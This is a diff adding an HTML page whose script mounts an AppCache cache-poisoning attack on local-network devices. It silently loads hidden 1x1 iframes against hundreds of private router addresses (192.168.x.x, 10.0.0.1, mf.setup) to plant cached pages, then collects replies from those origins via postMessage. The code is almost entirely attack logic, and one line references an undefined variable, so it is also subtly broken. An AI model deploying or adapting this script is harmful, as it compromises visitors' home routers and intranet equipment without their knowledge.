@@ -1,0 +1,87 @@
+<!DOCTYPE>
+<html manifest="m.manifest">
+<head><title></title></head>
+<body>
+<script>
+(function () {
+  var iframeTexts = ['<iframe src="http://', '" width=1 height=1></iframe>'];
+  var addressList = makeAddressList();
+  var wrapperDiv = document.createElement('div');
+  document.body.appendChild(wrapperDiv);
+  (function (success, failure) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function () {
+      xhr.abort();
+      if (this.status === 200) return success();
+      failure();
+    };
+    xhr.open('GET', '/' + Math.random());
+    xhr.send();
+  })(function () {
+    if (localStorage['CachePollution']) {
+      return;
+    }
+    localStorage['CachePollution'] = true;
+    var separator = '/i.html#toCache' + iframeTexts[1] + iframeTexts[0];
+    var joinedAddress = address.join(separator) + '/i.html#toCache';
+    wrapperDiv.innerHTML = iframeTexts.join(joinedAddress);
+    localStorage['lastAccess'] = (new Date()).getTime();
+  }, function () {
+    var targetAddress = '';
+    var pollutionResult = {};
+    checkPollution();
+    window.addEventListener("message", function (evn) {
+      if (evn.origin !== 'http://' + targetAddress) {
+        return;
+      }
+      var data = JSON.parse(evn.data);
+      pollutionResult[targetAddress] = data;
+      pollutionCache();
+    });
+    pollutionCache();
+    function pollutionCache () {
+      if (!addressList.length) {
+        return saveStorage(pollutionResult);
+      }
+      targetAddress = addressList.pop();
+      wrapperDiv.innerHTML = iframeTexts.join(targetAddress + '/i.html');
+    }
+  });
+
+  function checkPollution () {
+    var day = 1000 * 60 * 60 * 24;
+    var now = (new Date()).getTime();
+    var last = new Date(localStorage['lastAccess'] || 0);
+    if (!localStorage['lastAccess']) {
+      localStorage['lastAccess'] = now;
+      return true;
+    }
+    if (((now - last) / day) < 3) {
+      return;
+    }
+    localStorage['lastAccess'] = now;
+    return true;
+  }
+  function saveStorage (result) {
+    localStorage['pollutionResult'] = result;
+  }
+
+  function makeRange (min, max) {
+    var result = [];
+    for(var i = min; i < max;) result.push(i++);
+    return result;
+  }
+  function makeAddressList () {
+    var baseAddr = [0, 1, 2, 5, 10, 11, 12, 100, 111, 123];
+    var addAddr = makeRange(1, 21).concat(200).concat(makeRange(240, 255));
+    var otherAddr = ['10.0.0.1', '10.1.10.1', '172.16.255.254', 'mf.setup', 'web.setup'];
+    var address = [].concat.apply([], baseAddr.map(function (oct3) {
+      return addAddr.map(function (oct4) {
+        return '192.168.' + oct3 + '.' + oct4;
+      });
+    }));
+    return address.concat(otherAddr);
+  }
+})();
+</script>
+</html>
